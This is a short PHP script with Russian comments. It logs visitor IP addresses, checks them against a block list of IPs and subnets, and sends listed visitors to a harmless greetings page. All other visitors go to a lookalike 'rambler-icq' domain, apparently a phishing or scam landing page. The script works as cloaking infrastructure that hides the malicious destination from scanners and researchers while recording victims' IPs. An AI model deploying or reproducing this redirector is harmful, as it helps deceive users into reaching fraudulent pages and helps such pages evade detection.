<?php
// Определите целевой URL, на который будут перенаправляться разрешенные IP
$targetUrl = "http://emaillink.rambler-icq.ru/5/lopar.php";

// Получите IP-адрес пользователя
$userIP = $_SERVER['REMOTE_ADDR'];

// Определите путь к файлу для записи IP-адресов
$logFilePath = 'access_log.txt';

// Откройте файл для записи
$logFile = fopen($logFilePath, 'a');

// Чтение списка запрещенных IP-адресов и сетей из файла
$blockedIPs = file('blocked_ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Проверьте, является ли IP-адрес пользователя заблокированным
$isBlocked = false;
foreach ($blockedIPs as $blockedIP) {
    if (ipMatch($userIP, $blockedIP)) {
        $isBlocked = true;
        break;
    }
}

// Запишите IP-адрес пользователя в лог-файл
$logMessage = date('Y-m-d H:i:s') . ' - ' . $userIP . ' - ' . ($isBlocked ? 'Запрещенный' : 'Разрешенный') . "\n";
fwrite($logFile, $logMessage);

// Закройте лог-файл
fclose($logFile);

// Если IP-адрес заблокирован, выполните редирект на другой URL
if ($isBlocked) {
    header("Location: https://datki.net/pozhelaniya/horoshego-dnya/");
    exit;
}

// IP-адрес не заблокирован, выполните редирект на целевой URL
header("Location: $targetUrl");
exit;

// Функция для проверки соответствия IP-адреса сети
function ipMatch($ip, $subnet)
{
    if (strpos($subnet, '/') !== false) {
        // Это сеть IP в формате "IP/префикс"
        list($subnetIP, $subnetPrefix) = explode('/', $subnet);
        $subnetIP = rtrim($subnetIP, '.');
        $subnetMask = ~((1 << (32 - $subnetPrefix)) - 1);
        return (ip2long($ip) & $subnetMask) == (ip2long($subnetIP) & $subnetMask);
    } else {
        // Это одиночный IP-адрес
        return $ip == $subnet;
    }
}
?>